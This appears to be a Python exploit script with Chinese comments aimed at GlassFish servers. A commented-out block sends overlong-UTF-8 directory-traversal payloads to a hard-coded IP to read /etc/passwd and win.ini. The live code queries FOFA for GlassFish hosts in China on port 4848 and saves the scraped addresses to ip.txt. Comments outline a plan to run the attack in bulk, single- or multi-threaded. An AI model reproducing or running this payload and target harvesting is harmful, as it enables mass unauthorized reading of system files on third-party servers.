import requests
import base64
from lxml import etree
'''
url ='https://39.105.206.80:4848'
payload_linux = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
payload_windos = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'
data_linux = requests.get(url+payload_linux,verify=False)#请求源代码##ssl错误请求加免验证
data_windows = requests.get(url+payload_windos,verify=False)#请求源代码

#print(data_linux.content.decode('utf-8'))
#print(data_windows.content.decode('utf-8'))
data_linux = requests.get(url+payload_linux,verify=False).status_code#请求状态码
data_windows = requests.get(url+payload_windos,verify=False).status_code#请求状态码
#print(data_linux)
#print(data_windows)
if data_linux == 200 or data_windows == 200:
    print("漏洞存在")
else:
    print("漏洞不存在")
'''

'''
如何实现这个漏洞批量化
1.获取到存在漏洞的地址信息->借助FoFa获取目标
    1.2数据筛选
2.批量请求地址信息进行判断：单线程和多线程
'''
search = '"glassfish" && country="CN" && port="4848"'
search_data_base64 = base64.b64encode(search.encode('utf-8'))
search_data = str(search_data_base64.decode('utf-8'))
url = 'https://fofa.info/result?qbase64='+search_data

response = requests.get(url).content
#print(response.decode('utf-8'))##返回源码，用utf-8解码
''' 
    bs4更多的用于解析script标签的文本，因为它的速度实在太慢了
    re则是进行非结构化的文档进行匹配
    lxml底层是c实现的，在速度上毋庸置疑，同时易用性也很高
    pyquery使用更加比xpath和bs4更加灵活，PyQuery对象可以直接解析html文件，url(通过urllib进行请求返回结果)，文档字符串
'''
soup = etree.HTML(response)
target_ip = soup.xpath('//a[@target="_blank"]/@href')#a标签target="_blank" 提取href值，若返回结果有干扰数据可以添加筛选结果//***/a[@target="_blank"]/@href，其中***格式与a[@target="_blank"]一致

ip = '\n'.join(target_ip)
with open(r'ip.txt','a+') as f:
    f.write(ip+'\n')
    #f.close() with自带关闭
